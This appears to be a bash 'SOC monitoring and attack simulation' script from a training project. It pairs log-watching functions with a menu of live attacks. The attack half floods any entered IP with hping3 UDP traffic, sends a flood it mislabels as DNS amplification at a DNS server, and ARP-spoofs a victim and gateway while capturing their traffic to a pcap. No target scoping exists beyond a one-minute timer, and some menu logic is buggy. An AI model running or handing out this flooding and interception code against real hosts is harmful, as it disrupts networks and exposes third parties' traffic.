#!/bin/bash

# Multi-Attack Simulation Script with Timers and Improved Formatting
# Author: Yechiel Said
# Cradits: MOTW , Yehuda Livne , Alex Getzuk , OpenAI
# Description: Simulate DDoS, DNS Amplification, and MITM attacks with a 1-minute timer for each attack.

function RootCheck() {
    if [ "$(whoami)" != "root" ]; then
        echo "[!] This script must be run as root. Please switch to root and try again."
        exit 1
    fi
}
RootCheck

echo ""
echo "=================================================="
echo "          Welcome to the SOC Monitoring           "
echo "            and Attack Simulation Tool            "
echo "=================================================="
echo ""
echo "          A Comprehensive Security Operations      "
echo "               Center (SOC) Project               "
echo ""
echo "     Monitor, Analyze, and Simulate Cyber Threats  "
echo "             to Strengthen Your Network            "
echo ""
echo "=================================================="
echo "     Author: Yechiel Said                          "
echo "     Version: 1.0                                 "
echo "     Developed for: Advanced SOC Projects         "
echo "=================================================="
echo ""

OUTPUT_DIR="/soc_results"
mkdir -p "$OUTPUT_DIR"
exec > >(tee -a "$OUTPUT_DIR/report.txt")
REQUIRED_TOOLS=(nmap hydra masscan msfconsole hping3 arpspoof sslstrip tor macchanger curl geoip-bin)
INET=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+') # Your machine's IP
LOG_FILE="/var/log/attack_simulation.log" # Log file for attack actions
FOUND_IPS=() # Array to store discovered IPs on the network

# Install required tools
function INSTALL_DEPENDENCIES() {
    echo ""
    echo "=================================================="
    echo "               Installing Dependencies            "
    echo "=================================================="
    echo ""
    sudo apt-get update -y >/dev/null 2>&1
    sudo apt-get upgrade -y >/dev/null 2>&1

    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo "[#] Installing $tool..."
            sudo apt-get install -y "$tool" >/dev/null 2>&1 && echo "[+] $tool installed."
        else
            echo "[+] $tool is already installed."
        fi
    done
    echo ""
    echo "[*] All dependencies are installed."
    echo ""
}

# Function to discover network IPs
function DISCOVER_IPS() {
    echo ""
    echo "=================================================="
    echo "                Network Discovery                 "
    echo "=================================================="
    echo ""
    echo "[*] Scanning the network for live IPs..."
    FOUND_IPS=($(nmap -sn "${INET%.*}.0/24" | grep "Nmap scan report" | awk '{print $5}'))
    echo "[+] Found IPs on the network:"
    for ip in "${FOUND_IPS[@]}"; do
        echo "    - $ip"
    done
    echo ""
}

# Function to log attacks
function LOG_ATTACK() {
    local attack_type=$1
    local target_ip=$2
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack: $attack_type, Target: $target_ip" >> "$LOG_FILE"
    echo "[+] Attack logged: $attack_type on $target_ip"
    echo ""
}

# Timer function to limit attacks to 1 minute
function START_TIMER() {
    local pid=$1
    sleep 60 # Wait for 1 minute
    kill $pid 2>/dev/null
    echo ""
    echo "[!] Attack stopped after 1 minute."
    echo ""
}

# DDoS Attack Function
function DDOS_ATTACK() {
    echo ""
    echo "=================================================="
    echo "                  DDoS Attack                    "
    echo "=================================================="
    echo ""
    sleep 1
    read -p "Enter target IP for DDoS: " target_ip
    LOG_ATTACK "DDoS" "$target_ip"
    hping3 --udp --flood -p 80 "$target_ip" &
    ATTACK_PID=$!
    START_TIMER $ATTACK_PID
}

# DNS Amplification Function
function DNS_ATTACK() {
    echo ""
    echo "=================================================="
    echo "             DNS Amplification Attack            "
    echo "=================================================="
    echo ""
    sleep 1
    read -p "Enter target DNS server IP: " target_ip
    LOG_ATTACK "DNS Amplification" "$target_ip"
    echo "example.com" > dns_query.txt
    hping3 --udp --flood -p 53 -d 1200 -E dns_query.txt "$target_ip" &
    ATTACK_PID=$!
    START_TIMER $ATTACK_PID
    rm -f dns_query.txt
}

# MITM Attack Function
function MITM_ATTACK() {
    echo ""
    echo "=================================================="
    echo "                  MITM Attack                    "
    echo "=================================================="
    echo ""
    sleep 1
    read -p "Enter victim IP: " victim_ip
    read -p "Enter gateway IP: " gateway_ip
    LOG_ATTACK "MITM" "$victim_ip"
    arpspoof -i eth0 -t "$victim_ip" "$gateway_ip" &
    ARP_PID=$!
    tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
    TCPDUMP_PID=$!
    echo ""
    echo "[+] MITM attack in progress. Capturing traffic..."
    sleep 60
    kill $ARP_PID 2>/dev/null
    kill $TCPDUMP_PID 2>/dev/null
    echo ""
    echo "[+] MITM simulation complete. Traffic saved to /tmp/captured_traffic.pcap."
    echo ""
}

# Display attack options
function DISPLAY_ATTACK_OPTIONS() {
    echo ""
    echo "=================================================="
    echo "                Attack Options                   "
    echo "=================================================="
    echo ""
    echo "  1 - DDoS Attack"
    echo "  2 - DNS Amplification"
    echo "  3 - MITM Attack"
    echo "  4 - Discover Network IPs"
    echo " 99 - Exit"
    echo ""
    echo "[!] Choose an option:"
}

# Main attack selection menu
function ATTACK_MENU() {
    while true; do
        DISPLAY_ATTACK_OPTIONS
        sleep 1
        read -p "Enter your choice: " choice
        case $choice in
            1) DDOS_ATTACK ;;
            2) DNS_ATTACK ;;
            3) MITM_ATTACK ;;
            4) DISCOVER_IPS ;;
            99) echo "[*] Exiting..."; exit 0 ;;
            *) echo ""; echo "[!] Invalid option. Please try again." ;;
        esac
    done
}

# Main script execution
function MAIN_ATTACK() {
    echo ""
    echo "=================================================="
    echo "        Multi-Attack Simulation Script           "
    echo "=================================================="
    echo ""
    echo "[+] Your machine's IP: $INET"
    echo ""
    INSTALL_DEPENDENCIES
    ATTACK_MENU
    main_menu
}


# ==================================================
# Log Monitoring and Attack Detection Script
# ==================================================


# Define log file paths
SSH_PATH="/home/kali/Desktop/labs/authlogtest.log"
SMB_PATH="/home/kali/Desktop/labs/authlogtest.log"
FTP_PATH="/home/kali/Desktop/labs/authlogtest.log"
HTTP_PATH="/home/kali/Desktop/labs/authlogtest.log"
SYSLOG_PATH="/home/kali/Desktop/labs/authlogtest.log"

# Set output directory and file


# ==================================================
# General function to monitor logs with a timeout for inactivity
# ==================================================
function monitor_log {
    local LOG_PATH=$1
    local DESCRIPTION=$2
    local PATTERN=$3
    local INACTIVITY_TIMEOUT=30

    echo ""
    echo "=================================================="
    echo "              Monitoring $DESCRIPTION             "
    echo "=================================================="
    
    tail -F "$LOG_PATH" | while read -r line; do
        echo "activity" > /tmp/monitor_activity
        if echo "$line" | grep -E "$PATTERN"; then
            echo "[$DESCRIPTION Event] $line"
        fi
    done &

    local monitor_pid=$!
    echo "activity" > /tmp/monitor_activity

    while true; do
        if ! ps -p "$monitor_pid" > /dev/null; then
            echo ""
            echo "[$DESCRIPTION] Monitoring process has stopped."
            break
        fi

        if [ -f /tmp/monitor_activity ]; then
            if [ $(($(date +%s) - $(stat -c %Y /tmp/monitor_activity))) -gt $INACTIVITY_TIMEOUT ]; then
                echo ""
                echo "No activity for $INACTIVITY_TIMEOUT seconds. Stopping $DESCRIPTION monitoring..."
                kill "$monitor_pid"
                break
            fi
        fi

        sleep 1
    done

    rm -f /tmp/monitor_activity
}

# ==================================================
# Specific monitoring functions for different attacks
# ==================================================

# Function for monitoring SSH login events
function SSH_SOC {
    monitor_log "$SSH_PATH" "SSH login events" "sshd.*(Accepted|Failed|invalid|open session|close session|[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)"
}

# Function for monitoring SMB login events
function SMB_SOC {
    monitor_log "$SMB_PATH" "SMB login events" "smbd.*(session setup|close session|Failed|invalid|[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)"
}

# Function for monitoring FTP login events
function FTP_SOC {
    monitor_log "$FTP_PATH" "FTP login events" "ftp.*(Login successful|Failed login|open session|close session|[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)"
}

# Function for monitoring HTTP attacks (e.g., brute force, suspicious user agents)
function HTTP_SOC {
    monitor_log "$HTTP_PATH" "HTTP events" "httpd.*(GET|POST|Failed|403|404|500|[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+|User-Agent: suspicious)"
}

# Function for monitoring general system logs for suspicious activity
function SYS_SOC {
    monitor_log "$SYSLOG_PATH" "System events" "(authentication failure|unauthorized access|kernel panic|segfault|[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)"
}

# ==================================================
# Display all possible attacks with descriptions
# ==================================================
function DISPLAY_ATTACKS {
    echo ""
    echo "=================================================="
    echo "         List of Possible Attacks & Descriptions "
    echo "=================================================="
    echo "1. SSH Login Attempts: Tracks accepted and failed login attempts for SSH."
    echo "2. SMB Login Events: Detects valid and invalid SMB session attempts."
    echo "3. FTP Login Events: Monitors FTP logins and errors."
    echo "4. HTTP Attacks: Identifies brute-force attacks and suspicious user agents."
    echo "5. System Events: Logs authentication failures and unauthorized access."
    echo ""
}

# ==================================================
# Display and gather IP addresses from logs or network
# ==================================================
function DISPLAY_IP {
     echo "=================================================="
    echo "               Displaying IP Addresses           "
    echo "=================================================="
    echo -e "\nSelect the action for displaying IP addresses:"
    echo "1. Display IP addresses from auth.log"
    echo "2. Display IP addresses from the local network"
    echo "3. Exit"
	sleep 1
    read -p "Enter your choice: " choice
    echo ""
	if [[ "$choice" == "1" ]]; then
        grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" "$SSH_PATH" | sort | uniq
    elif [[ "$choice" == "2" ]]; then
        INET=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
        if [[ -n "$INET" ]]; then
            nmap -sP "$INET/24"
        else
            echo "No IP address found for eth0."
        fi
    else
        echo "Invalid choice. Please enter 'auth' or 'local'."
    fi
}

# ==================================================
# Allow the user to choose a target IP and check its activity
# ==================================================
function CHOOSE_TARGET {
    echo ""
    echo "=================================================="
    echo "                 Choose Target IP                "
    echo "=================================================="
    
    sleep 1
    read -p "Do you want to select from auth.log or local network? [auth/local]: " source_choice

    if [[ "$source_choice" == "auth" ]]; then
        IP_LIST=$(grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" "$SSH_PATH" | sort | uniq)
    elif [[ "$source_choice" == "local" ]]; then
        INET=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+')
        if [[ -n "$INET" ]]; then
            IP_LIST=$(nmap -sP "$INET/24" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+")
        else
            echo "No IP addresses found on the local network."
            return
        fi
    else
        echo "Invalid choice."
        return
    fi

    echo ""
    echo "Available IPs:"
    echo "$IP_LIST"
    sleep 1
    read -p "Enter a target IP from the list or type 'random' to select a random IP: " target_choice

    if [[ "$target_choice" == "random" ]]; then
        TARGET=$(echo "$IP_LIST" | shuf -n 1)
        echo "Randomly selected IP: $TARGET"
    else
        TARGET="$target_choice"
        echo "Selected IP: $TARGET"
    fi
}

# ==================================================
# Main attack monitoring menu
# ==================================================
function monitor_menu {
    echo ""
    echo "=================================================="
    echo "               Attack Monitoring Menu            "
    echo "=================================================="
    echo "1. SSH Attack Monitoring"
    echo "2. SMB Attack Monitoring"
    echo "3. FTP Attack Monitoring"
    echo "4. HTTP Attack Monitoring"
    echo "5. System Events Monitoring"
    echo "6. Display All Possible Attacks with Descriptions"
    echo "7. Choose a Target or Random IP"
    echo "8. Exit"
    echo ""
    sleep 1
    read -p "Enter your choice: " choice
    case $choice in
        1) SSH_SOC ;;
        2) SMB_SOC ;;
        3) FTP_SOC ;;
        4) HTTP_SOC ;;
        5) SYS_SOC ;;
        6) DISPLAY_ATTACKS ;;
        7) CHOOSE_TARGET ;;
        8) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid choice. Try again."; monitor_menu ;;
    esac
}

# ==================================================
# Main Menu Execution
# ==================================================
function main_monitor {
    echo ""
    echo "=================================================="
    echo "                   Main Menu                     "
    echo "=================================================="
    echo "1. Display IP Addresses "
    echo "2. Attack Monitoring"
    echo "3. Exit"
    echo ""
    sleep 1
    read -p "Enter your choice: " choice
    case $choice in
        1) DISPLAY_IP ;;
        2) monitor_menu ;;
        3) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid choice. Try again."; main_menu ;;
    esac
main_menu
}


function main_menu() {
    while true; do
        echo ""
        echo "=================================================="
        echo "                    Main Menu                     "
        echo "=================================================="
        echo "1. main_attacks - Access the Attack Simulation Menu"
        echo "2. main_monitor - Access the Monitoring Menu"
        echo "3. Exit - Exit the Program"
        echo "=================================================="
        echo ""
		sleep 1
        read -p "Enter your choice: " choice

        case $choice in
            1)
                echo "Redirecting to Attack Simulation Menu..."
                MAIN_ATTACK
                ;;
            2)
                echo "Redirecting to Monitoring Menu..."
                main_monitor
                ;;
            3)
                echo "Exiting the program. Goodbye!"
                exit 0
                ;;
            *)
                echo "Invalid choice. Please try again."
                ;;
        esac
    done
}
main_menu
